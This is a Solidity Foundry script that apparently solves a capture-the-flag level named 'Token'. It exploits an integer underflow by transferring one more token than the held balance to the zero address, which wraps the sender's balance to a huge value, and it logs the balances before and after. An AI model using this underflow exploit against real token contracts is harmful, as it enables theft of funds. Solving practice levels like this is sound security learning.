// SPDX-License-Identifier: MIT
// forge script script/Level05TokenSolution.sol -vvvv --broadcast
pragma solidity ^0.6.0;

import "../src/Level05Token.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level05TokenSolution is Script {

    Token public tokenInstance = Token(0x585ed5dAA432B491bf57e382E1675Bea090ed82e);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        uint256 balance = tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS"));
        console.log("Before balance: ", balance);

        tokenInstance.transfer(address(0), balance+1);
        balance = tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS"));
        console.log("After balance: ", balance);

        vm.stopBroadcast();
    }
}